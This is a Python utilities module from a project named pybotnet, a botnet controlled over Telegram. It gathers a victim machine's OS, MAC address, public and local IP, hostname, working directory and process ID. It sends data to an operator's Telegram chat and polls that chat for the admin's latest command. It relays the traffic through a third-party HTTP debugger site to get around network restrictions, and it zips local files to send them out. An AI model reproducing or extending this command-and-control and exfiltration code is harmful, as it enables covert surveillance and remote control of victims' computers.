'''Common utilities'''

# pybotnet modules
from . import settings

# import built-in & third-party modules
import requests
import json
import platform
import time
import zipfile

from os import getcwd, getpid, path
from socket import gethostname, gethostbyname
from uuid import getnode as get_system_mac_addres
from bs4 import BeautifulSoup


def get_current_epoc_time() -> float:
    return time.time()


def get_host_name_ip() -> str:
    try:
        host_name = gethostname()
        host_ip = gethostbyname(host_name)
        return f'{host_ip}\nHostname: {host_name}'
    except:
        return 'Unknown'


def get_my_global_ip() -> str:

    try:
        return get_my_ip_server_1()

    except:
        try:
            return get_my_ip_server_2()

        except:
            try:
                return get_my_ip_server_3()

            except:
                return 'Unknown'

# Servers to get your public IP


def get_my_ip_server_1():
    takeip = requests.post("https://api.myip.com", timeout=3).text
    ip = str(json.loads(takeip)["ip"])
    country = str(json.loads(takeip)["country"])
    ipaddr = f"{ip}\ncountry: {country}"
    return ipaddr


def get_my_ip_server_2():
    return requests.get('https://api.ipify.org', timeout=3).text


def get_my_ip_server_3():
    return requests.get('https://ident.me', timeout=3).text


def get_short_system_info() -> str:
    '''system mac addres, ip addres, operating system'''

    short_system_info = f"""------system info------
operating system: {platform.system()}
mac addres: {get_system_mac_addres()}
global ip: {get_my_global_ip()}"""

    return short_system_info


def get_full_system_info(pybotnet_uptime=None) -> str:
    f'''return full system info: \n
    get_short_system_info and pybotnet up time, local ip, pybotnet version'''

    full_system_info = f"""{get_short_system_info()}
pybotnet up time: {pybotnet_uptime} Seconds
local ip: {get_host_name_ip()}
current route: {getcwd()}
pid: {getpid()}
pybotnet version: {settings.pybotnet_version}
-----------------------"""

    # TODO: system uptime: {None}

    return full_system_info


def make_send_message_api_url(TELEGRAM_TOKEN, ADMIN_CHAT_ID, message) -> str:
    '''
    return api url for send message \n
    return f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/SendMessage?chat_id={ADMIN_CHAT_ID}&text={message}"
    '''
    return f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/SendMessage?chat_id={ADMIN_CHAT_ID}&text={message}"


def post_data(url, logger) -> bool:
    '''return False or response\n'''
    try:
        response = requests.post(url=url, timeout=5)
        if response.status_code == 200:
            logger.info('post_data data sended response: 200')
            return response

        logger.error(
            f'post_data error: data not sended response: {response.status_code}')
        return False

    except requests.exceptions.Timeout:
        logger.error(f'post_data error: timeout ')
        return False
    except:
        logger.error(f'post_data Unknown error')
        return False


def post_data_by_third_party_proxy(url, logger, time_out=5):
    '''
    return False or response \n
    Send information using the http debugger site \n
    Only for special situations: \n
    Internet restrictions in some countries
    '''
    payload = {"UrlBox": url,
               "AgentList": "Mozilla Firefox",
               "VersionsList": "HTTP/1.1",
               "MethodList": "POST"
               }

    try:
        response = requests.post(
            url="https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",
            data=payload,
            timeout=time_out)

        if response.status_code == 200:
            logger.info(
                'post_data_by_third_party_proxy data sended response: 200')
            return response

        logger.error(
            f'post_data_by_third_party_proxy error: data not sended response: {response.status_code}')
        return False

    except requests.exceptions.Timeout:
        logger.error(f'post_data_by_third_party_proxy error: timeout ')
        return False
    except:
        logger.error(f'post_data_by_third_party_proxy Unknown error')
        return False


def clean_response_third_party_proxy(response, logger):
    '''get http response from third party proxy (http debuger .com) and get telegram data'''
    try:
        response_source = response.text
        response_source = BeautifulSoup(response_source, "html.parser")
        response_source = response_source.find("div", id="ResultData").text
        return response_source.strip()

    except Exception as error:
        logger.info(
            f'clean_response_third_party_proxy: {error}')
        return False


def get_update_by_third_party_proxy(TELEGRAM_TOKEN, logger):
    '''Get the latest command sent to the bot in the last 24 hours by third party proxy'''

    get_updates_api_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/Getupdates"

    response = post_data_by_third_party_proxy(
        get_updates_api_url, logger)

    if not response:
        logger.error(
            'get_command_by_third_party_proxy > post_data_by_third_party_proxy return False')
        return False

    try:
        response_source = clean_response_third_party_proxy(
            response, logger=logger)
        if not response_source:
            return False

        if 'The remote server returned an error' in response_source:
            logger.error(
                f'get_update_by_third_party_proxy: [False TOKEN or ADMIN_CHAT_ID] error: {response_source}')
            return False

        if 'The remote server returned an error: (400) Bad Request.' in response_source:
            logger.error(
                f'get_update_by_third_party_proxy: telegram api server error: {response_source}')
            return False

        response_source = response_source.replace("Response Content", "")
        response_source = response_source.replace("edited_message", "message")
        response_source = json.loads(response_source)['result']
        return response_source
    except:
        logger.error(
            'get_update_by_third_party_proxy error Data extraction failed')
        return False


def get_last_update_id(messages: list, ADMIN_CHAT_ID: str, logger):
    ''' get last admin message and return update_id '''

    if messages == []:
        return False

    for message in messages[::-1]:
        try:
            last_message_chat_id = str(message['message']['chat']['id'])
            update_id = str(message["update_id"])
            if last_message_chat_id == ADMIN_CHAT_ID:
                return update_id
        except:
            continue

    # try to get last update_id and return
    last_message = messages.pop()
    try:
        return str(last_message["update_id"])
    except:
        logger.error(
            'get_last_update_id Failed to extract the latest update_id')
        return False


def set_message_ofset(messages: list, TELEGRAM_TOKEN: str, ADMIN_CHAT_ID: str, logger) -> None:

    update_id = get_last_update_id(messages, ADMIN_CHAT_ID, logger)

    if update_id:
        api_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/Getupdates?offset={update_id}"

        if post_data_by_third_party_proxy(api_url, logger):
            logger.info(f'Set_message_to_read Message_id: {update_id} DONE')
            return

    logger.error('set_message_ofset Failed')


def extract_last_admin_command(messages: list, ADMIN_CHAT_ID: str, TELEGRAM_TOKEN: str,  logger):

    message_text = False

    for message in messages[::-1]:
        try:
            last_message_chat_id = str(message['message']['chat']['id'])
            last_text = message['message']['text']

        except:
            continue

        if last_message_chat_id == ADMIN_CHAT_ID:
            logger.info(
                f' -command from admin: {last_text}')
            message_text = last_text
            break
        logger.info(f' -message from {last_message_chat_id}: {last_text}')

    set_message_ofset(messages, TELEGRAM_TOKEN, ADMIN_CHAT_ID, logger)

    return message_text


def make_zip_file(route, logger):
    '''get file route, make zip file and save to courent route \n
    return True, new_file_name |or| return False, 'None' \n
    sample: istrue, file_name = make_zip(./test.txt)

    To send a file in Telegram, this file must be zipped
    '''

    # input: /home/onion/text.py ooutput: text.zip
    new_file_name = path.splitext(path.basename(route))[0]
    new_file_name = f'{new_file_name}.zip'

    if not path.isfile(route):
        logger.error('make_zip_file: is not a file')
        return False, 'None'

    try:
        with zipfile.ZipFile(new_file_name, "w", compression=zipfile.ZIP_DEFLATED) as zf:
            zf.write(route, path.basename(route))
        logger.info(
            f'make_zip_file: The file was successfully zipped, file name {new_file_name}')
        return True, new_file_name

    except Exception as error:
        logger.error(f'make_zip_file: {error}')
        return False, error


def _make_send_file_api_url(TELEGRAM_TOKEN, ADMIN_CHAT_ID, zip_file_name, logger) -> str:

    # TODO: telegram error: The remote server returned an error: (400) Bad Request.  please debug this!
    ''' > have bug

    make and return api link for send file to admin
    To send a file in Telegram, this file must be zipped and its size must be less than 50 MB
    '''

    # opne zip file as binary
    try:
        with open(zip_file_name, 'rb') as bin_ary:
            binary_zip_file = bin_ary.read()

        return f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument?chat_id={ADMIN_CHAT_ID}&document={binary_zip_file}'

    except Exception as error:
        logger.error(
            f'make_send_file_api_url: read binary file error: {error}')
        return False


def _send_file_by_third_party_proxy(TELEGRAM_TOKEN, ADMIN_CHAT_ID, file_route, logger, time_out=300) -> bool:
    ''' > its not work, make_send_file_api_url() have some bug'''

    is_zip_true, zip_file_name = make_zip_file(file_route, logger)

    if is_zip_true:
        api = _make_send_file_api_url(
            TELEGRAM_TOKEN, ADMIN_CHAT_ID, zip_file_name, logger)

        if api:
            response = post_data_by_third_party_proxy(
                api, logger, time_out=time_out)
            response = clean_response_third_party_proxy(response, logger)

            if not response:
                return False

            elif 'The remote server returned an error: (400) Bad Request.' in response:
                logger.error(
                    f'get_update_by_third_party_proxy: telegram api server error: {response}')
                return False

            elif 'The remote server returned an error' in response:
                logger.error(
                    f'get_update_by_third_party_proxy: [False TOKEN or ADMIN_CHAT_ID] error: {response}')
                return False

            else:
                logger.info(f'_____its some else: {response}')

    logger.error('send_file_by_third_party_proxy: file not sended!')
    return False
